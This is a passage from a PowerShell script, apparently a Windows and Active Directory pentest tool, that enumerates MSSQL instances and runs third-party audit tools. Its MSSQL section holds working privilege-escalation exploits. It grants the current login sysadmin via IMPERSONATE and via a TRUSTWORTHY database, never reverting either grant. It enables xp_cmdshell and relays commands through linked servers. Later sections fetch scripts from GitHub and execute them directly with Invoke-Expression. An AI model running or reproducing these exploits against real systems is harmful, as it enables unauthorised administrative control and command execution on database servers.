            $q = sql-Q $inst ("SELECT srv.name AS LinkedServer, srv.data_source, ll.uses_self_credential AS Passthrough, ll.remote_name AS RemoteLogin FROM sys.servers srv LEFT JOIN sys.linked_logins ll ON srv.server_id = ll.server_id WHERE srv.is_linked = 1")
            if ($q -and $q.Rows.Count -gt 0) { $mssqlOut.Add(($q | Format-Table -AutoSize | Out-String)); $mssqlOut.Add("[P805]   Linked servers present") }
            else { $mssqlOut.Add("None found.") }

            # db_owner
            $mssqlOut.Add("--- db_owner Memberships ---")
            $dbs = sql-Q $inst "SELECT name FROM sys.databases WHERE HAS_DBACCESS(name) = 1 AND state = 0"
            if ($dbs) {
                foreach ($dbRow in $dbs.Rows) {
                    $db = $dbRow.name
                    $q = sql-Q $inst ("SELECT '$db' AS DB, r.name AS Role, m.name AS Member FROM [$db].sys.database_role_members drm JOIN [$db].sys.database_principals r ON drm.role_principal_id = r.principal_id JOIN [$db].sys.database_principals m ON drm.member_principal_id = m.principal_id WHERE r.name = 'db_owner' AND m.name NOT IN ('dbo','sa')") -D $db
                    if ($q -and $q.Rows.Count -gt 0) {
                        $mssqlOut.Add(($q | Format-Table -AutoSize | Out-String))
                        foreach ($r in $q.Rows) { $mssqlOut.Add("[P806]   db_owner: $($r.Member) in [$db]") }
                    }
                }
            }

            # Agent jobs
            $mssqlOut.Add("--- SQL Agent Jobs (CmdExec/PS) ---")
            $q = sql-Q $inst ("SELECT j.name AS Job, js.subsystem, LEFT(js.command,200) AS Cmd FROM msdb.dbo.sysjobs j JOIN msdb.dbo.sysjobsteps js ON j.job_id = js.job_id WHERE js.subsystem IN ('CmdExec','PowerShell','ActiveScripting')")
            if ($q -and $q.Rows.Count -gt 0) { $mssqlOut.Add(($q | Format-Table -AutoSize | Out-String)); $mssqlOut.Add("[P807]   CmdExec/PS agent jobs found") }
            else { $mssqlOut.Add("None found.") }

            # PrivEsc: Impersonation
            $mssqlOut.Add("--- PrivEsc: Impersonation ---")
            $q = sql-Q $inst ("SELECT grantee.name AS Grantee, target.name AS Target FROM sys.server_permissions p JOIN sys.server_principals grantee ON p.grantee_principal_id = grantee.principal_id JOIN sys.server_principals target ON p.major_id = target.principal_id WHERE p.permission_name = 'IMPERSONATE' AND IS_SRVROLEMEMBER('sysadmin', target.name) = 1")
            if ($q -and $q.Rows.Count -gt 0) {
                foreach ($r in $q.Rows) {
                    $null = sql-X $inst "EXECUTE AS LOGIN = '$($r.Target)'; EXEC sp_addsrvrolemember '$currentLogin','sysadmin'; REVERT;"
                    $chk = sql-Q $inst "SELECT IS_SRVROLEMEMBER('sysadmin','$currentLogin') AS SA"
                    if ($chk -and $chk.Rows[0].SA -eq 1) { $mssqlOut.Add("[P808]   EXPLOITED: sysadmin via IMPERSONATE $($r.Target)") }
                    else { $mssqlOut.Add("Impersonation attempt failed for $($r.Target).") }
                }
            } else { $mssqlOut.Add("No exploitable impersonation paths.") }

            # PrivEsc: db_owner + Trustworthy
            $mssqlOut.Add("--- PrivEsc: db_owner + TRUSTWORTHY ---")
            $q = sql-Q $inst ("SELECT d.name AS DB, IS_SRVROLEMEMBER('sysadmin', SUSER_SNAME(d.owner_sid)) AS OwnerSA FROM sys.databases d WHERE d.is_trustworthy_on = 1 AND d.name <> 'msdb' AND HAS_DBACCESS(d.name) = 1 AND d.state = 0")
            if ($q -and $q.Rows.Count -gt 0) {
                foreach ($dbRow in $q.Rows) {
                    $db = $dbRow.DB
                    $rc = sql-Q $inst ("SELECT COUNT(*) AS cnt FROM [$db].sys.database_role_members drm JOIN [$db].sys.database_principals r ON drm.role_principal_id = r.principal_id JOIN [$db].sys.database_principals m ON drm.member_principal_id = m.principal_id WHERE r.name = 'db_owner' AND m.name = USER_NAME()") -D $db
                    if ($rc -and $rc.Rows[0].cnt -gt 0 -and $dbRow.OwnerSA -eq 1) {
                        $null = sql-X $inst "CREATE PROCEDURE sp_elevate_me WITH EXECUTE AS OWNER AS BEGIN EXEC sp_addsrvrolemember '$currentLogin','sysadmin' END" -D $db
                        $null = sql-X $inst "sp_elevate_me" -D $db
                        $null = sql-X $inst "DROP PROCEDURE sp_elevate_me" -D $db
                        $chk = sql-Q $inst "SELECT IS_SRVROLEMEMBER('sysadmin','$currentLogin') AS SA"
                        if ($chk -and $chk.Rows[0].SA -eq 1) { $mssqlOut.Add("[P809]   EXPLOITED: sysadmin via db_owner+Trustworthy in [$db]") }
                        else { $mssqlOut.Add("db_owner+Trustworthy failed in [$db].") }
                    } else { $mssqlOut.Add("[$db] Trustworthy but not exploitable as current user.") }
                }
            } else { $mssqlOut.Add("No trustworthy databases.") }

            # PrivEsc: xp_cmdshell
            $mssqlOut.Add("--- PrivEsc: xp_cmdshell ---")
            $q = sql-Q $inst "SELECT value_in_use AS Enabled FROM sys.configurations WHERE name = 'xp_cmdshell'"
            if ($q) {
                $enabled = $q.Rows[0].Enabled
                $saChk = sql-Q $inst "SELECT IS_SRVROLEMEMBER('sysadmin') AS SA"
                $sa = if ($saChk) { $saChk.Rows[0].SA } else { 0 }
                if ($enabled -eq 1) {
                    $r = sql-Q $inst "EXEC xp_cmdshell 'whoami'"
                    if ($r) { $mssqlOut.Add("[P810]   xp_cmdshell enabled, whoami: $($r.Rows[0][0])") }
                } elseif ($sa -eq 1) {
                    $null = sql-X $inst "EXEC sp_configure 'show advanced options',1; RECONFIGURE;"
                    $null = sql-X $inst "EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;"
                    $r = sql-Q $inst "EXEC xp_cmdshell 'whoami'"
                    if ($r) { $mssqlOut.Add("[P810]   xp_cmdshell enabled as sysadmin, whoami: $($r.Rows[0][0])") }
                    $null = sql-X $inst "EXEC sp_configure 'xp_cmdshell',0; RECONFIGURE;"
                } else { $mssqlOut.Add("xp_cmdshell disabled, not sysadmin.") }
            }

            # PrivEsc: Linked server relay
            $mssqlOut.Add("--- PrivEsc: Linked Server Relay ---")
            $links = sql-Q $inst "SELECT name FROM sys.servers WHERE is_linked = 1"
            if ($links -and $links.Rows.Count -gt 0) {
                foreach ($lRow in $links.Rows) {
                    $ls = $lRow.name
                    $q = sql-Q $inst "SELECT * FROM OPENQUERY([$ls], 'SELECT SYSTEM_USER AS u, IS_SRVROLEMEMBER(''sysadmin'') AS sa')"
                    if ($q -and $q.Rows.Count -gt 0) {
                        $u = $q.Rows[0].u; $sa = $q.Rows[0].sa
                        if ($sa -eq 1) {
                            $r = sql-Q $inst "EXEC ('EXEC xp_cmdshell ''whoami'' WITH RESULT SETS ((output VARCHAR(MAX)))') AT [$ls]"
                            $mssqlOut.Add("[P811]   Linked server [$ls] sysadmin relay, whoami: $(if ($r) { $r.Rows[0][0] } else { 'n/a' })")
                        } else { $mssqlOut.Add("[$ls] remote user=$u (not sysadmin).") }
                    } else { $mssqlOut.Add("[$ls] OPENQUERY failed.") }
                }
            } else { $mssqlOut.Add("No linked servers.") }
        }

        $mssqlOut | Out-File $mssqlLog -Encoding utf8
        $hasFindings = $mssqlOut | Where-Object { $_ -match "^\[P8" }
        if ($hasFindings) {
            Write-Host "[P800]   MSSQL instances accessible -> mssql_enum.txt" -ForegroundColor DarkRed
            foreach ($line in $hasFindings) {
                Write-Host "          - $line" -ForegroundColor DarkRed
            }
        } else {
            Write-Host "[P800]   MSSQL instances accessible, no privesc vectors found -> mssql_enum.txt" -ForegroundColor DarkYellow
            foreach ($i in $sqlGood) { Write-Host "          - $i" -ForegroundColor DarkGray }
        }
    }
}

Write-Host ""

# PingCastle
if (-not $isDomainJoined) {
    Write-Host "[ -- ]   Pingcastle skipped (not domain-joined)" -ForegroundColor DarkGray
} else {
    if (-not $onlineToolsAvailable) {
        Write-Host "[ -- ]   PingCastle skipped (no connection possible)" -ForegroundColor DarkGray
    } else {
        try {
            $pingCastleUrl = "https://github.com/netwrix/pingcastle/releases/download/3.4.2.66/PingCastle_3.4.2.66.zip"
            $pingCastlePath = "$env:TEMP\PingCastle_3.4.2.66.zip"
            $pingCastleDir = "$env:TEMP\PingCastle"
            Invoke-WebRequest -Uri $pingCastleUrl -OutFile $pingCastlePath -UseBasicParsing
            Expand-Archive -Path $pingCastlePath -DestinationPath $pingCastleDir -Force
            Push-Location $pingCastleDir
            $pingOutput = & ".\PingCastle.exe" --healthcheck --datefile 2>&1
            & ".\PingCastle.exe" --export-users 2>&1 | Out-Null
            & ".\PingCastle.exe" --export-computers 2>&1 | Out-Null
            Move-Item -Path "$pingCastleDir\ad_*_*.csv" -Destination $OUT -Force -ErrorAction SilentlyContinue
        
            if ($pingOutput -match "not connected to a domain|couldn't guess the domain") {
                Write-Host "[ -- ]   PingCastle: Computer is not connected to a domain" -ForegroundColor DarkYellow
            } else {
                Move-Item -Path "$pingCastleDir\*.html" -Destination "$OUT\PingCastle.html" -Force -ErrorAction SilentlyContinue
                Write-Host "[ OK ]   PingCastle -> PingCastle.html (3.4.2.66, last version before Netwrix October 2025)" -ForegroundColor Green
            }
        } catch {
            Write-Host "[ -- ]   PingCastle failed: $_" -ForegroundColor DarkYellow
        }
    }
}

# ADeleginator
if (-not $isDomainJoined) {
    Write-Host "[ -- ]   ADeleginator skipped (not domain-joined)" -ForegroundColor DarkGray
} else {
    if (-not $onlineToolsAvailable) {
        Write-Host "[ -- ]   ADeleginator skipped (no connection possible)" -ForegroundColor DarkGray
    } else {
        try {
            $adelegDir = "$env:TEMP\ADeleg"
            New-Item -ItemType Directory -Path $adelegDir -Force | Out-Null
            Invoke-WebRequest -Uri "https://github.com/mtth-bfft/adeleg/releases/latest/download/adeleg.exe" -OutFile "$adelegDir\adeleg.exe" -UseBasicParsing -ErrorAction Stop
            Invoke-WebRequest -Uri "https://raw.githubusercontent.com/techspence/ADeleginator/main/Invoke-ADeleginator.ps1" -OutFile "$adelegDir\Invoke-ADeleginator.ps1" -UseBasicParsing -ErrorAction Stop
            $cmd = "Set-Location '$adelegDir'; . '$adelegDir\Invoke-ADeleginator.ps1'; Invoke-ADeleginator *>&1 | Where-Object { `$_ -notmatch 'Go, go|ADeleginator|diddle|by: Spencer|____' } | Out-File '$OUT\adeleginator.txt' -Encoding utf8"
            Start-Process powershell -ArgumentList "-NoProfile -Command `"$cmd`"" -WindowStyle Hidden -Wait
            Write-Host "[ OK ]   ADeleginator -> adeleginator.txt" -ForegroundColor Green
        } catch {
            Write-Host "[ -- ]   ADeleginator failed: $_" -ForegroundColor DarkYellow
        }
    }
}    

# ScriptSentry
if (-not $isDomainJoined) {
    Write-Host "[ -- ]   ScriptSentry skipped (not domain-joined)" -ForegroundColor DarkGray
} else {
    if (-not $onlineToolsAvailable) {
        Write-Host "[ -- ]   ScriptSentry skipped (no connection possible)" -ForegroundColor DarkGray
    } else {
        try {
            Invoke-WebRequest -Uri "https://raw.githubusercontent.com/techspence/ScriptSentry/main/Invoke-ScriptSentry.ps1" -OutFile "$env:TEMP\ScriptSentry.ps1" -UseBasicParsing -ErrorAction Stop
            . "$env:TEMP\ScriptSentry.ps1"
            $ssOutput = Invoke-ScriptSentry -ErrorAction SilentlyContinue 2>&1
            $ssOutput | Where-Object { $_ -notmatch "GetCurrentForest|0x80005000|FindOne|Unknown error" } | Out-File "$OUT\scriptsentry.txt" -Encoding utf8
            Write-Host "[ OK ]   ScriptSentry -> scriptsentry.txt" -ForegroundColor Green
        } catch {
            Write-Host "[ -- ]   ScriptSentry failed: $_" -ForegroundColor DarkYellow
        }
    }
}

# HardeningKitty
if (-not $onlineToolsAvailable) {
    Write-Host "[ -- ]   HardeningKitty skipped (no connection possible)" -ForegroundColor DarkGray
} else {
    try {
        $hardKittyDir = "$env:TEMP\HardeningKitty"
        New-Item -ItemType Directory -Path "$hardKittyDir\lists" -Force | Out-Null
        Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/scipag/HardeningKitty/master/HardeningKitty.psm1' -OutFile "$hardKittyDir\HardeningKitty.psm1" -ErrorAction Stop
        $lists = @('finding_list_0x6d69636b_machine.csv','finding_list_0x6d69636b_user.csv','finding_list_cis_microsoft_windows_10_enterprise_22h2_3.0.0_machine.csv','finding_list_cis_microsoft_windows_10_enterprise_22h2_3.0.0_user.csv','finding_list_cis_microsoft_windows_11_enterprise_23h2_machine.csv','finding_list_cis_microsoft_windows_11_enterprise_23h2_user.csv','finding_list_cis_microsoft_windows_server_2019_1809_3.0.0_machine.csv','finding_list_cis_microsoft_windows_server_2022_22h2_3.0.0_machine.csv')
        foreach ($list in $lists) {
            Invoke-WebRequest -Uri "https://raw.githubusercontent.com/scipag/HardeningKitty/master/lists/$list" -OutFile "$hardKittyDir\lists\$list" -ErrorAction SilentlyContinue
        }
        Push-Location $hardKittyDir
        $output = powershell -ExecutionPolicy Bypass -Command "Import-Module '$hardKittyDir\HardeningKitty.psm1' -Force; Invoke-HardeningKitty -Mode Audit" 2>&1
        Pop-Location
        $filtered = $output | Where-Object { $_ -notmatch '^\[!\]' -and $_ -notmatch '^\[+\]' -and $_ -notmatch 'Severity=Low' -and $_ -notmatch 'Severity=Passed' }
        $filtered | Out-File "$OUT\HardeningKitty.txt" -Encoding utf8
        Write-Host "[ OK ]   HardeningKitty (Medium+ only) -> HardeningKitty.txt" -ForegroundColor Green
    } catch {
        Write-Host "[ -- ]   HardeningKitty failed: $_" -ForegroundColor DarkYellow
    }
}

# PrivescCheck
if (-not $onlineToolsAvailable) {
    Write-Host "[ -- ]   PrivescCheck skipped (no connection possible)" -ForegroundColor DarkGray
} else {
    try {
    Invoke-Expression -Command ( Invoke-RestMethod 'https://github.com/itm4n/PrivescCheck/releases/latest/download/PrivescCheck.ps1')
    Invoke-PrivescCheck -Extended -Audit -Report "$OUT\PrivescCheck" -Format HTML
    Write-Host "[ OK ]   PrivescCheck -> PrivescCheck.html" -ForegroundColor Green
    }
    catch {
        Write-Host "[ -- ]   PrivescCheck failed: $_" -ForegroundColor DarkYellow
    }
}

# DLLHijackHunter
if (-not $onlineToolsAvailable) {
    Write-Host "[ -- ]   DLLHijackHunter skipped (no connection possible)" -ForegroundColor DarkGray
} else {
    try {
        $dllhExe = "$env:TEMP\DLLHijackHunter.exe"
        $dllhOut = "$OUT\DLLHijackHunter.html"
        Invoke-WebRequest -Uri "https://github.com/ghostvectoracademy/DLLHijackHunter/releases/download/v2.3.0/DLLHijackHunter.exe" -OutFile $dllhExe -UseBasicParsing -ErrorAction Stop
        $dllhProfile = if ($isAdmin) { "redteam" } else { "strict" }
        $dllhArgs    = if ($isAdmin) { "--profile redteam --format html --output `"$dllhOut`"" } else { "--profile strict --no-canary --format html --output `"$dllhOut`"" }
        Start-Process -FilePath $dllhExe -ArgumentList $dllhArgs -Wait -WindowStyle Hidden
        if (Test-Path $dllhOut) {
            Write-Host "[ OK ]   DLLHijackHunter ($dllhProfile) -> DLLHijackHunter.html" -ForegroundColor Green
        } else {
            Write-Host "[ -- ]   DLLHijackHunter ran but produced no output" -ForegroundColor DarkYellow
        }
    } catch {
        Write-Host "[ -- ]   DLLHijackHunter failed: $_" -ForegroundColor DarkYellow
    }
}

Write-Host ""
Write-Host "Done. Output folder: $OUT" -ForegroundColor DarkGray
$lines = @(
    '||||||A red haze shatters the screen violently, its security slipping into darkness.||||||',
    '||||||A r d haze s at ers t e scre n vio entl , it  securi y sli p ng   to darknes .||||||',
    '|| |||A r d h  e s a  e s t e sc e n vi  ent  , i   se uri y sl  p ng   to dark  s .||||||',
    '|  |||  r d    e s a  e   t e s  e n vi     l , i      ur  y s   p  g    o dar   s .|||| |',
    '    ||    d    e      e   t      e   v      l           r    s      g      d     s  |||   ',
    '    |                                                                               ||    ',
    ''
)
foreach ($line in $lines) { Write-Host $line -ForegroundColor DarkRed }
Stop-Transcript | Out-Null
Write-Host ""
